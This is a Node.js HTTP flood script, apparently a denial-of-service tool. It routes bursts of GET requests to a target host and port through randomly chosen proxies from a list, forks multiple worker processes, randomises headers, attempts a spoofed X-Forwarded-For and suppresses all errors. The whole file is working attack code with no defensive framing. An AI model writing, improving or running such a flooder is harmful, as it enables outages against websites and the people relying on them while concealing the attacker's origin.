process.on('uncaughtException', function() {});
const net = require('net');
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring');
const cluster = require('cluster');
const acceptrand = [
    "gzip",
    "*",
	"identity",
	"deflate",
	"compress",
    "br"
];

const randconnection = [
    "keep-alive",
    "close"
];

var proxies = fs.readFileSync('tcplegit.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
//var ua2 = fs.readFileSync('uatcp.txt', 'utf-8').replace(/\r/g, '').split('\n');
var tarPOST = "http://"+process.argv[2]+":"+process.argv[3];
var parsed = url.parse(tarPOST);
if (cluster.isMaster){
    for (let i = 0; i<process.argv[5]; i++){
        cluster.fork();
    }
setTimeout(() => {
process.exit(1);
}, process.argv[4] * 1000);
}
//const AllUA = fs.readFileSync("header.txt", 'utf-8').toString().replace(/\r/g, '').split('\n'); //读取UA

function spoof(){
    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}

setInterval(function() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');
    var socket = net.connect(proxy[1], proxy[0]);
    socket.setKeepAlive(false, 0);
    socket.setTimeout(5000);
    for (let j = 0; j < 64; j++) {
    socket.write('GET ' + tarPOST +' HTTP/1.1\r\nHost: '+ parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: ' + acceptrand[Math.floor(Math.random() * acceptrand.length)] + '\r\nConnection: ' + randconnection[Math.floor(Math.random() * randconnection.length)] + '\r\nX-Forwarded-For: spoof()\r\n\r\n');
	}
	socket.on('data', function() {
        setTimeout(function() {
            socket.destroy();
            return delete socket;
        }, 5000);
    })
});